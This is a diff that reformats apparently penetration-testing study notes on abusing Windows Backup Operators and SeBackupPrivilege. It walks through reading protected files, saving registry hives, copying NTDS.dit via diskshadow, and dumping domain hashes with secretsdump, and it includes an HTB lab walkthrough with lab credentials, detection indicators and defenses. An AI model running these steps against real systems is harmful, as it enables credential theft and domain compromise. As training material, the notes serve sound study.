@@ -1,4 +1,4 @@
-# Windows Built-in Groups Privilege Escalation
+# 🏛️ Windows Built-in Groups
 
 ## 🎯 Overview
 
@@ -7,16 +7,18 @@
 ## 🏛️ Key Built-in Groups
 
 ### High-Privilege Groups
-| Group | Key Privileges | Attack Potential |
-|-------|---------------|------------------|
-| **Backup Operators** | SeBackup, SeRestore | NTDS.dit access, file system bypass |
-| **Event Log Readers** | Event log access | Sensitive log data extraction |
-| **DnsAdmins** | DNS service control | Code execution via DLL injection |
-| **Hyper-V Administrators** | VM management | VM escape, hypervisor attacks |
-| **Print Operators** | Print service control | Service manipulation attacks |
-| **Server Operators** | Service management | Service privilege escalation |
+
+| Group                      | Key Privileges        | Attack Potential                    |
+| -------------------------- | --------------------- | ----------------------------------- |
+| **Backup Operators**       | SeBackup, SeRestore   | NTDS.dit access, file system bypass |
+| **Event Log Readers**      | Event log access      | Sensitive log data extraction       |
+| **DnsAdmins**              | DNS service control   | Code execution via DLL injection    |
+| **Hyper-V Administrators** | VM management         | VM escape, hypervisor attacks       |
+| **Print Operators**        | Print service control | Service manipulation attacks        |
+| **Server Operators**       | Service management    | Service privilege escalation        |
 
 ### Assignment Contexts
+
 ```cmd
 # Common reasons for assignment:
 - Least privilege enforcement (avoiding Domain Admin creation)
@@ -27,24 +29,27 @@
 ```
 
 **Assessment Priority:**
-- Always enumerate group memberships (`whoami /groups`)
-- Document excessive/unnecessary memberships
-- Review historical assignments (leftovers from testing)
+
+* Always enumerate group memberships (`whoami /groups`)
+* Document excessive/unnecessary memberships
+* Review historical assignments (leftovers from testing)
 
 ## 🔐 Backup Operators - SeBackupPrivilege Exploitation
 
 ### Privilege Fundamentals
 
 #### SeBackupPrivilege Capabilities
-- **Folder traversal** without ACL restrictions
-- **File copying** from protected directories  
-- **Registry hive backup** (SAM, SYSTEM, SECURITY)
-- **NTDS.dit access** on Domain Controllers
-- **ACL bypass** with FILE_FLAG_BACKUP_SEMANTICS
+
+* **Folder traversal** without ACL restrictions
+* **File copying** from protected directories
+* **Registry hive backup** (SAM, SYSTEM, SECURITY)
+* **NTDS.dit access** on Domain Controllers
+* **ACL bypass** with FILE\_FLAG\_BACKUP\_SEMANTICS
 
 ### Detection and Enablement
 
 #### Group Membership Verification
+
 ```cmd
 # Check current group memberships
 whoami /groups
@@ -54,6 +59,7 @@ BUILTIN\Backup Operators                       Group S-1-5-32-551
 ```
 
 #### Privilege Enumeration
+
 ```cmd
 # Check privilege status
 whoami /priv
@@ -66,6 +72,7 @@ SeRestorePrivilege            Restore files and directories  Disabled
 ### Privilege Activation
 
 #### Method 1: PowerShell Modules
+
 ```powershell
 # Import required libraries
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -88,6 +95,7 @@ whoami /priv
 ```
 
 #### Method 2: Elevated Context
+
 ```cmd
 # May require elevated Command Prompt to bypass UAC
 # Run Command Prompt as Administrator
@@ -99,6 +107,7 @@ whoami /priv
 ### Protected File Access
 
 #### Standard Access Failure
+
 ```powershell
 # Attempt normal file access
 dir C:\Confidential\
@@ -109,6 +118,7 @@ Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
 ```
 
 #### SeBackupPrivilege Bypass
+
 ```powershell
 # Use specialized copy function
 Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege flag.txt' .\flag.txt
@@ -125,6 +135,7 @@ cat .\Contract.txt
 ### Registry Hive Extraction
 
 #### SAM and SYSTEM Backup
+
 ```cmd
 # Backup critical registry hives
 reg save HKLM\SYSTEM SYSTEM.SAV
@@ -139,13 +150,15 @@ The operation completed successfully.
 ### NTDS.dit Extraction Strategy
 
 #### Challenge
-- **NTDS.dit** contains NTLM hashes for all domain accounts
-- **File locked** by Active Directory services
-- **Restricted access** even for privileged users
+
+* **NTDS.dit** contains NTLM hashes for all domain accounts
+* **File locked** by Active Directory services
+* **Restricted access** even for privileged users
 
 #### Solution: Shadow Copy Technique
 
 #### Step 1: Create Shadow Copy
+
 ```cmd
 # Launch DiskShadow utility
 diskshadow.exe
@@ -164,6 +177,7 @@ DISKSHADOW> exit
 ```
 
 #### Step 2: Verify Shadow Copy
+
 ```powershell
 # Examine shadow copy contents
 dir E:
@@ -178,6 +192,7 @@ d-----        3/24/2021   6:38 PM                Windows
 ```
 
 #### Step 3: Copy NTDS.dit
+
 ```powershell
 # Copy database file using SeBackupPrivilege
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
@@ -187,6 +202,7 @@ Copied 16777216 bytes
 ```
 
 ### Alternative: Robocopy Method
+
 ```cmd
 # Use built-in robocopy with backup mode
 robocopy /B E:\Windows\NTDS .\ntds ntds.dit
@@ -202,6 +218,7 @@ ROBOCOPY     ::     Robust File Copy for Windows
 ### Method 1: DSInternals Module
 
 #### Extract Specific Account
+
 ```powershell
 # Import DSInternals module
 Import-Module .\DSInternals.psd1
@@ -223,6 +240,7 @@ Secrets
 ### Method 2: SecretsDump.py
 
 #### Extract All Domain Hashes
+
 ```bash
 # Use Impacket secretsdump for complete extraction
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
@@ -239,19 +257,22 @@ svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c5
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Credentials**: `svc_backup:HTB_@cademy_stdnt!`
-- **Access Method**: RDP
-- **Objective**: Leverage SeBackupPrivilege to obtain flag at `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`
+
+* **Credentials**: `svc_backup:HTB_@cademy_stdnt!`
+* **Access Method**: RDP
+* **Objective**: Leverage SeBackupPrivilege to obtain flag at `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`
 
 ### Detailed Step-by-Step Solution
 
 #### 1. RDP Connection
+
 ```bash
 # Connect via RDP to target (IP will be provided)
 xfreerdp /v:[TARGET_IP] /u:svc_backup /p:'HTB_@cademy_stdnt!'
 ```
 
 #### 2. Verify Group Membership
+
 ```cmd
 # Open Command Prompt
 # Check group memberships
@@ -262,6 +283,7 @@ BUILTIN\Backup Operators                       Group S-1-5-32-551
 ```
 
 #### 3. Check Privilege Status
+
 ```cmd
 # Verify SeBackupPrivilege
 whoami /priv
@@ -272,6 +294,7 @@ SeRestorePrivilege            Restore files and directories  Disabled
 ```
 
 #### 4. Enable SeBackupPrivilege
+
 ```powershell
 # Open elevated PowerShell (Run as Administrator)
 # Import required modules (may need to download/locate first)
@@ -287,6 +310,7 @@ Get-SeBackupPrivilege
 ```
 
 #### 5. Target File Analysis
+
 ```powershell
 # Attempt normal access to verify restriction
 cat 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt'
@@ -296,6 +320,7 @@ Access to the path is denied.
 ```
 
 #### 6. Bypass Restriction with SeBackupPrivilege
+
 ```powershell
 # Copy protected file using SeBackupPrivilege
 Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
@@ -311,6 +336,7 @@ cat .\flag.txt
 ### Alternative Methods
 
 #### Method 1: Robocopy Approach
+
 ```cmd
 # Use robocopy with backup mode
 robocopy /B "c:\Users\Administrator\Desktop\SeBackupPrivilege" .\backup flag.txt
@@ -320,6 +346,7 @@ type .\backup\flag.txt
 ```
 
 #### Method 2: Registry Approach (if flag in registry)
+
 ```cmd
 # Create registry backup
 reg save HKLM\SOFTWARE SOFTWARE.SAV
@@ -330,6 +357,7 @@ reg save HKLM\SOFTWARE SOFTWARE.SAV
 ## ⚠️ Limitations and Considerations
 
 ### Explicit Deny ACEs
+
 ```cmd
 # FILE_FLAG_BACKUP_SEMANTICS won't bypass:
 - Explicit DENY entries for current user
@@ -338,6 +366,7 @@ reg save HKLM\SOFTWARE SOFTWARE.SAV
 ```
 
 ### Operational Considerations
+
 ```cmd
 # Best practices:
 - Test on non-production systems first
@@ -349,6 +378,7 @@ reg save HKLM\SOFTWARE SOFTWARE.SAV
 ## 🔍 Detection Indicators
 
 ### Process Activity
+
 ```cmd
 # Monitor for:
 - diskshadow.exe execution
@@ -358,6 +388,7 @@ reg save HKLM\SOFTWARE SOFTWARE.SAV
 ```
 
 ### Event Logs
+
 ```cmd
 # Key Event IDs:
 Event ID 4656 - Handle to object requested (backup operations)
@@ -367,6 +398,7 @@ Event ID 5120 - DPAPI key backup (credential access)
 ```
 
 ### File System Changes
+
 ```cmd
 # Indicators:
 - Temporary shadow copies
@@ -378,6 +410,7 @@ Event ID 5120 - DPAPI key backup (credential access)
 ## 🛡️ Defense Strategies
 
 ### Group Membership Hardening
+
 ```cmd
 # Regular audits:
 - Review Backup Operators membership quarterly
@@ -387,6 +420,7 @@ Event ID 5120 - DPAPI key backup (credential access)
 ```
 
 ### Monitoring Implementation
+
 ```cmd
 # Deploy monitoring for:
 - SeBackupPrivilege usage events
@@ -396,6 +430,7 @@ Event ID 5120 - DPAPI key backup (credential access)
 ```
 
 ### Access Controls
+
 ```cmd
 # Additional protections:
 - Implement NTDS.dit backup monitoring
@@ -407,34 +442,39 @@ Event ID 5120 - DPAPI key backup (credential access)
 ## 📋 Backup Operators Exploitation Checklist
 
 ### Prerequisites
-- [ ] **Backup Operators membership** verified (`whoami /groups`)
-- [ ] **SeBackupPrivilege available** (may be disabled initially)
-- [ ] **Elevated context** (Administrator Command Prompt/PowerShell)
-- [ ] **Required modules** (SeBackupPrivilegeUtils.dll, SeBackupPrivilegeCmdLets.dll)
+
+* [ ] **Backup Operators membership** verified (`whoami /groups`)
+* [ ] **SeBackupPrivilege available** (may be disabled initially)
+* [ ] **Elevated context** (Administrator Command Prompt/PowerShell)
+* [ ] **Required modules** (SeBackupPrivilegeUtils.dll, SeBackupPrivilegeCmdLets.dll)
 
 ### Privilege Activation
-- [ ] **Import PowerShell modules** for privilege manipulation
-- [ ] **Enable SeBackupPrivilege** (`Set-SeBackupPrivilege`)
-- [ ] **Verify activation** (`Get-SeBackupPrivilege`)
-- [ ] **Confirm with whoami** (`whoami /priv`)
+
+* [ ] **Import PowerShell modules** for privilege manipulation
+* [ ] **Enable SeBackupPrivilege** (`Set-SeBackupPrivilege`)
+* [ ] **Verify activation** (`Get-SeBackupPrivilege`)
+* [ ] **Confirm with whoami** (`whoami /priv`)
 
 ### File System Exploitation
-- [ ] **Identify target files** (sensitive documents, databases)
-- [ ] **Test normal access** (verify restriction exists)
-- [ ] **Use Copy-FileSeBackupPrivilege** to bypass ACLs
-- [ ] **Verify successful copy** and read content
+
+* [ ] **Identify target files** (sensitive documents, databases)
+* [ ] **Test normal access** (verify restriction exists)
+* [ ] **Use Copy-FileSeBackupPrivilege** to bypass ACLs
+* [ ] **Verify successful copy** and read content
 
 ### Domain Controller Attacks
-- [ ] **Create shadow copy** (`diskshadow.exe`)
-- [ ] **Copy NTDS.dit** from shadow volume
-- [ ] **Backup registry hives** (SYSTEM, SAM)
-- [ ] **Extract credentials** (DSInternals or secretsdump.py)
+
+* [ ] **Create shadow copy** (`diskshadow.exe`)
+* [ ] **Copy NTDS.dit** from shadow volume
+* [ ] **Backup registry hives** (SYSTEM, SAM)
+* [ ] **Extract credentials** (DSInternals or secretsdump.py)
 
 ### Post-Exploitation
-- [ ] **Document accessed files** for reporting
-- [ ] **Clean up temporary files** (shadow copies, copied files)
-- [ ] **Extract credential data** for further attacks
-- [ ] **Report findings** with remediation recommendations
+
+* [ ] **Document accessed files** for reporting
+* [ ] **Clean up temporary files** (shadow copies, copied files)
+* [ ] **Extract credential data** for further attacks
+* [ ] **Report findings** with remediation recommendations
 
 ## 💡 Key Takeaways
 
@@ -446,6 +486,6 @@ Event ID 5120 - DPAPI key backup (credential access)
 6. **Detection possible** through privilege usage monitoring and file access logs
 7. **Common oversight** - accounts left in group after legitimate backup tasks
 
----
+***
 
-*Backup Operators group membership provides extensive file system access capabilities that can be leveraged for significant privilege escalation, especially in Domain Controller environments.* 
+_Backup Operators group membership provides extensive file system access capabilities that can be leveraged for significant privilege escalation, especially in Domain Controller environments._
